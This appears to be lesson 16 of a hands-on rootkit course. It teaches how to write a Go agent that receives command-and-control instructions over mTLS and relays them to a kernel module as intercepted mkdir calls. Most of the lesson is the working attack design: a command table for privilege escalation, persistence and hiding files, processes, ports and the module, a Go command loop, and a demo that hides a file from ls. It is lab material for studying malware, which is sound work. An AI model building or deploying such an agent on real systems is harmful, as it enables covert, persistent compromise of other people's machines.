# L16: mkdir Bridge

L15 connects the agent to the server.
But it just reads one line and exits.
The kernel module listens for mkdir commands.
The agent needs to translate server instructions into mkdir calls.

## The bridge pattern

The server speaks human-readable commands.
The kernel module speaks mkdir names.
The agent translates between them.

```text
  Server                  Agent                  Kernel
    |                       |                       |
    |-- "HIDE FILE x" ---->|                       |
    |                       |-- os.Mkdir            |
    |                       |   "rklings.h.f.x"    |
    |                       |                  [kretprobe]
    |                       |                  target_add("x")
    |                       |                       |
    |-- "QUIT" ----------->|                       |
    |                       |-- os.Mkdir            |
    |                       |   "rklings.quit"      |
    |                       |   (exits)             |
```

## Command mapping

The server sends one command per line.
The agent maps each to a mkdir name:

```text
Server command             mkdir name
--------------             ----------
PING                       rklings.ping
STATUS                     rklings.status
ESCALATE                   rklings.e
ESCALATE <pid>             rklings.e.<pid>
PERSIST                    rklings.persist
UNPERSIST                  rklings.unpersist
HIDE MODULE                rklings.h.m
UNHIDE MODULE              rklings.u.m
HIDE FILE <name>           rklings.h.f.<name>
UNHIDE FILE <idx>          rklings.u.f.<idx>
HIDE PID <pid>             rklings.h.i.<pid>
UNHIDE PID <idx>           rklings.u.i.<idx>
HIDE CONTENT <str>         rklings.h.c.<str>
UNHIDE CONTENT <idx>       rklings.u.c.<idx>
HIDE PORT <port>           rklings.h.p.<port>
UNHIDE PORT <idx>          rklings.u.p.<idx>
LIST                       rklings.list
QUIT                       rklings.quit
```

## os.Mkdir

Go's `os.Mkdir` issues the mkdir syscall.
The kernel module's kretprobe intercepts it before the real mkdir runs.
The directory is never created. The command is dispatched.

```go
err := os.Mkdir("rklings.h.f.secret.txt", 0)
```

The permission mode does not matter (the kretprobe nullifies the path).
Use 0 for clarity.

## Command loop

The agent reads lines in a loop until the server closes the connection
or sends QUIT:

```go
scanner := bufio.NewScanner(conn)
for scanner.Scan() {
    line := scanner.Text()
    name := translate(line)
    os.Mkdir(name, 0)
}
```

## You write

`main.go` (~80 lines):

- mTLS setup (reuse L15 pattern, provided in starter)
- `translate(line string) string`: map server command to mkdir name
- Command loop: read lines, translate, os.Mkdir

## API

```go
import "os"

// Issue mkdir syscall (intercepted by kernel module)
err := os.Mkdir(name, 0)

// Split command line
parts := strings.SplitN(line, " ", 3)
// parts[0] = verb, parts[1] = target type, parts[2] = argument
```

## Test it

```
$ rklings run l16
```

The lab server starts on the host.
The kernel module is pre-loaded in the VM.
The agent connects and waits for commands.

In the lab web panel at http://localhost:8080, type:

```
HIDE FILE secret.txt
```

In the VM:

```
root@vm:~# ls /tmp/
(secret.txt is not listed)
root@vm:~# cat /tmp/secret.txt
this file exists but ls cannot see it
```

The file is hidden from `ls` but still accessible.
The agent translated the server command to `mkdir rklings.h.f.secret.txt`,
and the kernel module hid it.

## Validate

```
$ rklings validate l16
  [+] agent binary builds
  [+] module loaded
  [+] agent connects to mTLS server
  [+] HIDE FILE command hides file from ls
  [+] hidden file still readable via cat
  [+] LIST command dispatched
  [+] multiple commands processed in sequence
  PASS
```

## Next

The agent bridges commands.
L17 adds real command dispatch on the server side: PING, STATUS, HIDE,
PERSIST, ESCALATE, all over the mTLS channel.
